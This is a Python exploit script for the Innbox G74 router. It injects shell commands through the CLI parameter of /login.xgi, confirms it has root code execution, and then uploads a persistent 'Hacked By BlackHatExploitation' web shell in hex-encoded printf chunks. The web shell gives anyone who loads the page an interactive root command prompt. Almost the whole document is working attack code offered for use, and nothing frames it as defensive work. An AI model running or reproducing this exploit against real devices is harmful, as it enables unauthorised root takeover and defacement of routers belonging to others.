#!/usr/bin/env python3
"""Upload web shell to Innbox G74 via RCE"""
import sys
import time
import os
import urllib.parse
import urllib.request
import ssl

UA = "Mozilla/5.0"

class Target:
    def __init__(self, base, timeout=20):
        if "://" not in base:
            base = "http://" + base
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.ctx = ssl.create_default_context()
        self.ctx.check_hostname = False
        self.ctx.verify_mode = ssl.CERT_NONE

    def get(self, path):
        url = self.base + path
        req = urllib.request.Request(url, headers={"User-Agent": UA})
        try:
            with urllib.request.urlopen(req, timeout=self.timeout, context=self.ctx) as r:
                return r.status, r.read()
        except urllib.error.HTTPError as e:
            return e.code, e.read()
        except Exception as e:
            return None, str(e).encode()

    def run(self, cmd, read=False):
        marker = os.urandom(4).hex()
        out = f"/etc/www/graphic/{marker}.txt"
        payload = f"exec,>,{out},2>&1;{cmd}"
        self.get("/login.xgi?CLI=" + urllib.parse.quote(payload, safe=""))

        if not read:
            time.sleep(0.1)
            return True

        result = None
        for _ in range(10):
            time.sleep(0.3)
            st, body = self.get(f"/graphic/{marker}.txt")
            if st == 200:
                result = body.decode("latin1", "replace")
                break

        self.get("/login.xgi?CLI=" + urllib.parse.quote(f"rm -f {out}", safe=""))
        return result


SHELL_HTML = '''<!DOCTYPE html>
<html><head><title>Shell</title>
<style>
body{background:#000;color:#0f0;font-family:monospace;padding:20px}
h2{color:#f00}
#t{background:#111;border:1px solid #333;padding:10px;height:70vh;overflow-y:auto}
#o{white-space:pre-wrap}
.p{color:#0ff}.c{color:#ff0}.r{color:#0f0}
#i{width:80%;background:#000;color:#0f0;border:1px solid #333;padding:8px}
#b{background:#0f0;color:#000;padding:8px 15px;border:none}
</style></head>
<body>
<h2>Hacked By <a href="https://github.com/BlackHatExploitation/innbox_root" target="_blank" style="color:#f00;text-decoration:none">BlackHatExploitation</a></h2>
<div id="t"><div id="o"></div></div>
<input id="i" placeholder="cmd"><button id="b">Run</button>
<script>
var O=document.getElementById("o"),I=document.getElementById("i");
function r(){return Math.random().toString(36).substr(2,6)}
function e(t){var d=document.createElement("div");d.textContent=t;return d.innerHTML}
function s(m){return new Promise(function(r){setTimeout(r,m)})}
async function x(c){
if(!c)return;
var m=r(),f="/etc/www/graphic/"+m+".txt";
O.innerHTML+="<span class=p>root#</span> <span class=c>"+e(c)+"</span>\\n";
var p="exec,>,"+f+",2>&1;"+c;
try{
await fetch("/login.xgi?CLI="+encodeURIComponent(p));
await s(500);
var t="";
for(var i=0;i<8;i++){var z=await fetch("/graphic/"+m+".txt");if(z.ok){t=await z.text();break}await s(300)}
O.innerHTML+="<span class=r>"+(t||"(no output)")+"</span>\\n\\n";
fetch("/login.xgi?CLI="+encodeURIComponent("rm -f "+f));
}catch(e){}
document.getElementById("t").scrollTop=99999;
}
I.onkeypress=function(e){if(e.key=="Enter"){x(I.value);I.value=""}};
document.getElementById("b").onclick=function(){x(I.value);I.value=""};
x("id");x("uname -a");
</script></body></html>'''


def main():
    url = input("Target [http://192.168.1.1]: ").strip() or "http://192.168.1.1"
    t = Target(url)

    print("[*] Checking RCE...")
    result = t.run("id; uname -a", read=True)
    if not result or "uid=" not in result:
        print("[-] RCE failed")
        sys.exit(1)
    print("[+] RCE works:\n    " + result.strip().replace("\n", "\n    "))

    print("[*] Uploading web shell...")

    # Clear first
    t.run("rm -f /etc/www/graphic/shell.htm")

    # Convert to hex and use printf
    html_bytes = SHELL_HTML.encode('utf-8')
    hex_str = html_bytes.hex()

    # Write using printf in chunks (printf \xHH format)
    chunk_size = 200  # 100 bytes = 200 hex chars
    total = len(hex_str)

    for i in range(0, total, chunk_size):
        chunk_hex = hex_str[i:i+chunk_size]
        # Convert hex pairs to \xHH format
        printf_str = ''.join(f'\\x{chunk_hex[j:j+2]}' for j in range(0, len(chunk_hex), 2))
        cmd = f"printf '{printf_str}' >> /etc/www/graphic/shell.htm"
        t.run(cmd)
        pct = min(100, int((i + chunk_size) * 100 / total))
        print(f"    [{pct}%]", end='\r')

    print("    [100%]")

    # Verify
    print("[*] Verifying...")
    time.sleep(1)
    st, body = t.get("/graphic/shell.htm")
    if st == 200 and b"BlackHatExploitation" in body:
        print("[+] SUCCESS!")
        print(f"[+] Web shell: {url}/graphic/shell.htm")
    else:
        print(f"[-] Upload failed, status: {st}")
        if body:
            print(f"    Body preview: {body[:100]}")
        sys.exit(1)


if __name__ == "__main__":
    main()
